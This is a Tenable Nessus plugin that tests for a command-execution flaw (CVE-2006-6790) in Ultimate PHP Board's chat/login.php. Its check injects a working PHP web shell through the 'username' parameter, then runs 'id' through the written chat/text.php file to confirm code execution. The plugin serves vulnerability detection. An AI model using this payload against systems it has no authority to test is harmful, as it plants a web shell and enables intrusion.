#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(23966);
  script_version("$Revision: 1.9 $");
  script_cve_id("CVE-2006-6790");
  script_bugtraq_id(21760);
  script_xref(name:"OSVDB", value:"36176");

  script_name(english:"Ultimate PHP Board chat/login.php username Parameter Arbitrary Command Execution");
  script_summary(english:"Tries to run a command with Ultimate PHP Board");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows injection of
arbitrary PHP code." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Ultimate PHP Board (UPB). 

The version of UPB installed on the remote host does not sanitize
input to the 'username' parameter of the 'chat/login.php' script
before writing it to 'chat/text.php'.  Regardless of PHP's settings,
an attacker can leverage this flaw to inject arbitrary PHP code into
the second file and then retrieve that to have the code executed on
the affected host subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/2999" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
 script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/upb", "/forums", "/forum", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure the script exists.
  url = string(dir, "/chat/login.php?option=chat");
  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0, "The web server did not answer");
  res = r[2];

  # If it does...
  if ('src="send.php?username="' >< res)
  {
    # Try to inject a command.
    cmd = "id";
    param = rand_str();
    user = "geo";

    exploit = string(user, ' <?php if (isset($_GET[', param, '])) {passthru($_GET[', param, ']); die;} ?>');
    r = http_send_recv3(method:"GET", port: port, 
      item:string(url, "&","username=", urlencode(str:exploit)));
    if (isnull(r)) exit(0);
    res = r[2];

    # Check whether it worked.
    r = http_send_recv3(method:"GET", port:port, 
      item:string( dir, "/chat/text.php?",  param, "=", cmd));
    if (isnull(r)) exit(0);
    res = r[2];

    line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
    if (line && user >< line)
    {
      line = strstr(line, user) - user;
      if (report_verbosity)
      {
        report = string(
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote host.\n",
          "It produced the following output :\n",
          "\n",
          "  ", line
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      exit(0);
    }
  }
}
